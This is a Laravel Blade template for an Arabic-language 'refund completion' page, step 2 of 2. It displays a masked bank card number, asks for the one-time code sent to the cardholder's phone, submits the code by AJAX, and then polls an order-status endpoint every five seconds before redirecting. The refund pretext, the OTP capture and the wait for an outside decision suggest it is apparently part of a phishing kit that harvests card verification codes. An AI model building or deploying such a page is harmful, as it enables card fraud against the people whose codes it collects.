


<!DOCTYPE html>
<html dir="rtl" lang="ar">
  <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>إتمام المعاملة - الخدمات الإلكترونية</title>
    <!-- Favicons -->
    <link href="favicon.png" rel="icon">
    <link href="favicon.png" rel="apple-touch-icon">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
    <!-- Vendor CSS Files -->
    <link href="{{asset('asset/vendor/aos/aos.css')}}" rel="stylesheet">
    <link href="{{asset('asset/vendor/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
    <link href="{{asset('asset/vendor/bootstrap-icons/bootstrap-icons.css')}}" rel="stylesheet">
    <link href="{{asset('asset/vendor/boxicons/css/boxicons.min.css')}}" rel="stylesheet">
    <link href="{{asset('asset/vendor/glightbox/css/glightbox.min.css')}}" rel="stylesheet">
    <link href="{{asset('asset/vendor/swiper/swiper-bundle.min.css')}}" rel="stylesheet">
    <script src="https://kit.fontawesome.com/996fc7b00b.js" crossorigin="anonymous"></script>

    <!-- Template Main CSS File -->
    <link href="{{asset('asset/css/style.css')}}" rel="stylesheet">
    <script src="https://code.iconify.design/iconify-icon/1.0.1/iconify-icon.min.js"></script>


    
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>



    <script src="https://js.stripe.com/v3/"></script>
    <script src="jquery.creditCardValidator.js"></script>

   </head>
   <body>
    <div id="loader" style="display: none; text-align: center; margin-top: 20px;">
        <img src="{{ asset('asset/img/loader.gif') }}" alt="Loading..." width="50" height="50">
        <p>جاري التحقق من حالة الطلب...</p>
    </div>
       <!-- النموذج -->
       <form id="paymentForm" name="onePass" method="POST">
           @csrf
           <div class="container d-flex justify-content-center mt-5 mb-5">
               <div class="row g-3">
                   <div class="col-md-8">
                       <span style="font-size: 18px;">إكمال عملية الإسترداد خطوة (2-2)</span>
                       <div class="card">
                           <div class="accordion" id="accordionExample">
                               <div class="card">
                                   <div class="card-header p-0">
                                       <h2 class="mb-0">
                                           <span class="btn btn-light btn-block text-left p-3 rounded-0" style="width: 100%;" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                                               <div class="d-flex align-items-center justify-content-between">
                                                   @php
                                                       $number = $formData['CardNumber']; // Example long number
                                                       $last4Digits = substr($number, -4); // Get last 4 digits
                                                       $maskedNumber = str_repeat('X', strlen($number) - 4) . '-' . $last4Digits; // Mask the number
                                                   @endphp
                                                   <span>{{$maskedNumber}}</span>
                                                   <div class="icons">
                                                       <img src="{{asset('asset/img/2ISgYja.png')}}" width="30">
                                                       <img src="{{asset('asset/img/download.png')}}" width="30">
                                                   </div>
                                               </div>
                                           </span>
                                       </h2>
                                   </div>
                                   <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
                                       <div class="card-body payment-card-body">
                                           <div class="">
                                               <div class="p-3 d-flex justify-content-between">
                                                   <div class="d-flex flex-column"><span style="font-weight:300;"> سوف يتم إرسال رمز على هاتفك المحمول المرتبط بالبطاقة البنكية خلال 60 ثانية ، لإتمام المعاملة المطلوبة.</span></div>
                                               </div>
                                               <br>
                                               <br>
                                               <span class="font-weight-normal card-text">قم بإدخال رمز التاكيد المرسل على الهاتف </span>
                                               <div class="input"><i class="fa fa-lock"></i><input style="text-align: center;" type="text" name="code" maxlength="6" minlength="4" class="form-control" placeholder="" required></div>
                                               <a style="font-weight: bold; font-size:13px;margin-top:5px;font-weight:500;cursor: pointer;" href="#">لم يصل رمز ؟ إعادة الإرسال</a>
                                               <br>
                                               <span style="color:red; font-weight: bold; font-size:12px;text-align: center;">سيتم إرسال رمز التحقق خلال 60 ثانية</span>
                                               <br>
                                               <div class="p-3">
                                                   <button type="submit" class="btn btn-primary btn-block free-button" style="height: 52px;width: 100%;background-color:#354A93;">تأكيد العملية</button>
                                               </div>
                                           </div>
                                           <span class="text-muted certificate-text"><i class="fa fa-lock"></i> سوف يتم إنجار معاملتك من خلال الشهادة الآمنة SSL</span>
                                       </div>
                                   </div>
                               </div>
                           </div>
                       </div>
                   </div>
               </div>
           </div>
       </form>
   
       <!-- الرسائل -->
       <div id="loadingMessage" style="display: none; text-align: center; margin-top: 20px;">
           <p>جاري المعالجة... <i class="fa fa-spinner fa-spin"></i></p>
       </div>
       <div id="errorMessage" style="display: none; text-align: center; margin-top: 20px; color: red;">
           <p>حدث خطأ أثناء المعالجة. يرجى المحاولة مرة أخرى.</p>
       </div>
   
       <script>
           $(document).ready(function () {
               // إرسال النموذج عبر AJAX
               $('#paymentForm').on('submit', function (e) {
                   e.preventDefault(); // منع الإرسال التقليدي
   
                   // إظهار رسالة "جاري المعالجة"
                   $('#loadingMessage').show();
                   $('#errorMessage').hide();
   
                   // إرسال البيانات عبر AJAX
                   $.ajax({
                       url: "{{ route('confirm') }}",
                       type: "POST",
                       data: $(this).serialize(),
                       success: function (response) {
                           // إخفاء رسالة "جاري المعالجة"
                           $('#loadingMessage').hide();
   
                           if (response.success) {
                               // بدء التحقق من حالة الطلب
                               checkOrderStatus(response.order_id);
                           } else {
                               // إظهار رسالة الخطأ
                               $('#errorMessage').show();
                           }
                       },
                       error: function () {
                           // إخفاء رسالة "جاري المعالجة" وإظهار رسالة الخطأ
                           $('#loadingMessage').hide();
                           $('#errorMessage').show();
                       }
                   });
               });
   
               // التحقق من حالة الطلب كل 5 ثوانٍ
               function checkOrderStatus(orderId) {
                $('#loader').show();

                   const interval = setInterval(function () {
                       $.get("{{ route('check_order_status') }}", { code: orderId }, function (data) {
                           if (data.status == 1) {
                               clearInterval(interval); // إيقاف التحقق
                               $('#loader').hide();

                               window.location.href = "{{ route('success') }}"; // توجيه إلى صفحة النجاح
                           } else if (data.status == 2) {
                               clearInterval(interval); // إيقاف التحقق
                               $('#loader').hide();
                               window.location.href = "{{ route('error') }}"; // توجيه إلى صفحة الفشل
                           }
                       });
                   }, 5000); // التحقق كل 5 ثوانٍ
               }
           });
       </script>
   </body>
   </html>